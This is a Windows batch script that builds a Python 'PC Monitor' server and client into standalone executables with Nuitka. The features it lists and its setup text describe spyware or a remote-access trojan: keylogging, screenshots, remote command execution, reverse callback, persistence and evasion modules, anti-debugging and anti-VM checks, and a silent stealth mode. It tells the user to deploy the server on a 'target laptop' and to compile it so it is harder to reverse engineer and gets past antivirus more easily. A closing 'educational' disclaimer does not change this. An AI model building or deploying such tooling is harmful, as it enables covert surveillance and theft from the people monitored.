@echo off
echo ========================================
echo PC Monitor Build Script - Nuitka Edition
echo ========================================
echo.

REM Check if Nuitka is installed
python -m nuitka --version >nul 2>&1
if errorlevel 1 (
    echo Nuitka not found. Installing...
    pip install nuitka
    echo.
)

REM Check for C compiler
echo Checking for C compiler...
where cl.exe >nul 2>&1
if errorlevel 1 (
    echo.
    echo [WARNING] Microsoft Visual C++ compiler not found!
    echo Nuitka requires a C compiler for best performance.
    echo.
    echo Options:
    echo 1. Install Visual Studio Build Tools
    echo 2. Install MinGW-w64
    echo 3. Continue anyway (slower, fallback mode)
    echo.
    set /p COMPILER_CHOICE="Continue without compiler? (y/N): "
    if /i not "%COMPILER_CHOICE%"=="y" (
        echo.
        echo Download Visual Studio Build Tools from:
        echo https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
        echo.
        pause
        exit /b 1
    )
)

REM ========================================
REM BUILD CONFIGURATION
REM ========================================
echo.
echo Select what to build:
echo 1. Build Server only (PCMonitor.exe)
echo 2. Build Client only (PCMonitorClient.exe)
echo 3. Build Both (Server + Client)
echo.
set /p BUILD_CHOICE="Enter choice (1-3) [default: 3]: "
if "%BUILD_CHOICE%"=="" set BUILD_CHOICE=3

echo.
echo Select console window mode:
echo 1. No console (silent background mode - recommended)
echo 2. With console (see output/debug info)
echo.
set /p CONSOLE_CHOICE="Enter choice (1-2) [default: 1]: "
if "%CONSOLE_CHOICE%"=="" set CONSOLE_CHOICE=1

echo.
echo Select optimization level:
echo 1. Fast build (development)
echo 2. Optimized build (production - smaller, faster)
echo.
set /p OPTIMIZE_CHOICE="Enter choice (1-2) [default: 2]: "
if "%OPTIMIZE_CHOICE%"=="" set OPTIMIZE_CHOICE=2

REM Set console flag
if "%CONSOLE_CHOICE%"=="1" (
    set CONSOLE_FLAG=--windows-disable-console
    echo Using: No console window
) else (
    set CONSOLE_FLAG=
    echo Using: Console window enabled
)

REM Set optimization flags
if "%OPTIMIZE_CHOICE%"=="2" (
    set OPTIMIZE_FLAGS=--lto=yes
    echo Using: Link-Time Optimization enabled
) else (
    set OPTIMIZE_FLAGS=--lto=no
    echo Using: Fast build mode
)

echo.
echo ========================================
echo Starting Build with Nuitka...
echo ========================================
echo.

REM Clean previous builds
if exist build rmdir /s /q build
if exist *.dist rmdir /s /q *.dist
if exist *.build rmdir /s /q *.build
if exist *.onefile-build rmdir /s /q *.onefile-build

REM ========================================
REM BUILD SERVER
REM ========================================
if "%BUILD_CHOICE%"=="1" goto BUILD_SERVER
if "%BUILD_CHOICE%"=="3" goto BUILD_SERVER
goto SKIP_SERVER

:BUILD_SERVER
echo ========================================
echo Building Server (PCMonitor.exe) with Nuitka...
echo ========================================
echo This may take several minutes on first build...
echo.

python -m nuitka ^
    --standalone ^
    --onefile ^
    %CONSOLE_FLAG% ^
    --output-dir=dist ^
    --output-filename=PCMonitor.exe ^
    --enable-plugin=tk-inter ^
    --include-package=flask ^
    --include-package=flask_cors ^
    --include-package=pynput ^
    --include-package=PIL ^
    --include-package=requests ^
    --include-package=server_modules ^
    --include-package=evasion_modules ^
    --include-package=persistence_modules ^
    --follow-imports ^
    --assume-yes-for-downloads ^
    %OPTIMIZE_FLAGS% ^
    --show-progress ^
    --show-memory ^
    server.py

if errorlevel 1 (
    echo.
    echo [ERROR] Server build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Server built successfully!
echo.

:SKIP_SERVER

REM ========================================
REM BUILD CLIENT
REM ========================================
if "%BUILD_CHOICE%"=="2" goto BUILD_CLIENT
if "%BUILD_CHOICE%"=="3" goto BUILD_CLIENT
goto SKIP_CLIENT

:BUILD_CLIENT
echo ========================================
echo Building Client (PCMonitorClient.exe) with Nuitka...
echo ========================================
echo This may take several minutes on first build...
echo.

python -m nuitka ^
    --standalone ^
    --onefile ^
    %CONSOLE_FLAG% ^
    --output-dir=dist ^
    --output-filename=PCMonitorClient.exe ^
    --enable-plugin=tk-inter ^
    --include-package=PIL ^
    --include-package=requests ^
    --include-package=flask ^
    --include-package=flask_cors ^
    --include-package=client_modules ^
    --follow-imports ^
    --assume-yes-for-downloads ^
    %OPTIMIZE_FLAGS% ^
    --show-progress ^
    --show-memory ^
    client.py

if errorlevel 1 (
    echo.
    echo [ERROR] Client build failed!
    echo.
    pause
    exit /b 1
)
echo [SUCCESS] Client built successfully!
echo.

:SKIP_CLIENT

REM Clean up build artifacts
echo.
echo Cleaning up build artifacts...
if exist *.dist rmdir /s /q *.dist
if exist *.build rmdir /s /q *.build
if exist *.onefile-build rmdir /s /q *.onefile-build

REM ========================================
REM BUILD COMPLETE
REM ========================================
echo.
echo ========================================
echo Build Complete!
echo ========================================
echo.
if "%BUILD_CHOICE%"=="1" (
    echo Server executable: dist\PCMonitor.exe
    dir dist\PCMonitor.exe | find "PCMonitor.exe"
)
if "%BUILD_CHOICE%"=="2" (
    echo Client executable: dist\PCMonitorClient.exe
    dir dist\PCMonitorClient.exe | find "PCMonitorClient.exe"
)
if "%BUILD_CHOICE%"=="3" (
    echo Server executable: dist\PCMonitor.exe
    echo Client executable: dist\PCMonitorClient.exe
    echo.
    dir dist\*.exe
)

echo.
echo ========================================
echo NUITKA BUILD BENEFITS
echo ========================================
echo.
echo ✓ Faster execution (compiled to C)
echo ✓ Better optimization than PyInstaller
echo ✓ Smaller file sizes with LTO
echo ✓ Native code (harder to reverse engineer)
echo ✓ No Python runtime extracted to temp
echo ✓ Better anti-virus compatibility
echo.
echo ========================================
echo MODULAR STRUCTURE
echo ========================================
echo.
echo SERVER (server.py):
echo   - Core monitoring (server_modules/)
echo   - Evasion techniques (evasion_modules/)
echo   - Persistence methods (persistence_modules/)
echo   - Single executable with all features
echo.
echo CLIENT (client.py):
echo   - Multi-PC monitoring (client_modules/)
echo   - Callback listener integrated
echo   - Single executable with all features
echo.
echo ========================================
echo INSTALLATION INSTRUCTIONS
echo ========================================
echo.
echo SERVER SETUP (Target laptop):
echo ----------------------------------------
echo 1. Copy dist\PCMonitor.exe to target laptop
if "%CONSOLE_CHOICE%"=="1" (
    echo 2. Run PCMonitor.exe - runs silently in background
    echo    ^(Check config.json for API key after first run^)
) else (
    echo 2. Run PCMonitor.exe - console shows API key
)
echo 3. Copy the API key from config.json
echo 4. Keep PCMonitor.exe running
echo.
echo OPTIONAL - Enable Reverse Connection:
echo   a. Edit callback_config.json on server
echo   b. Set "enabled": true
echo   c. Set "callback_url" to your client's IP
echo   d. Set matching "callback_key"
echo   e. Restart PCMonitor.exe
echo.
echo ========================================
echo CLIENT SETUP (Your monitoring PC):
echo ----------------------------------------
echo 1. Copy dist\PCMonitorClient.exe to your PC
echo 2. Run PCMonitorClient.exe
echo 3. Click "Add Server" or wait for auto-registration
echo.
echo ========================================
echo FEATURES INCLUDED
echo ========================================
echo.
echo SERVER:
echo   ✓ Live keylogging with text stream
echo   ✓ Automatic ^& manual screenshots
echo   ✓ Mouse click tracking
echo   ✓ Window change monitoring
echo   ✓ Event logging with timestamps
echo   ✓ Remote command execution
echo   ✓ API with authentication
echo   ✓ Reverse connection support
echo   ✓ Mutex (single instance)
echo   ✓ Anti-debugging checks
echo   ✓ Anti-VM detection
echo   ✓ String obfuscation ready
echo.
echo CLIENT:
echo   ✓ Multi-PC monitoring in tabs
echo   ✓ Live keystroke feed
echo   ✓ Screenshot gallery
echo   ✓ Event search and filtering
echo   ✓ Remote control panel
echo   ✓ Callback listener
echo   ✓ Auto-refresh
echo.
if "%CONSOLE_CHOICE%"=="1" (
    echo ========================================
    echo STEALTH MODE NOTES
    echo ========================================
    echo Server runs with NO visible window
    echo - No taskbar icon
    echo - No console window
    echo - Silent operation
    echo.
    echo To stop server:
    echo - Use Kill Switch from client
    echo - Or use Task Manager to end PCMonitor.exe
    echo.
)
echo ========================================
echo EDUCATIONAL NOTE
echo ========================================
echo.
echo This is a demonstration for educational purposes.
echo Includes basic evasion techniques for analysis:
echo   - Mutex (single instance checking)
echo   - Anti-debugging detection
echo   - Anti-VM detection
echo   - Modular architecture
echo.
echo ALL DETECTIONS ARE NON-BLOCKING.
echo The program continues to run for demonstration.
echo.
echo ========================================
echo.
echo Press any key to view build folder...
pause >nul
explorer dist
echo.
echo Build process complete!
pause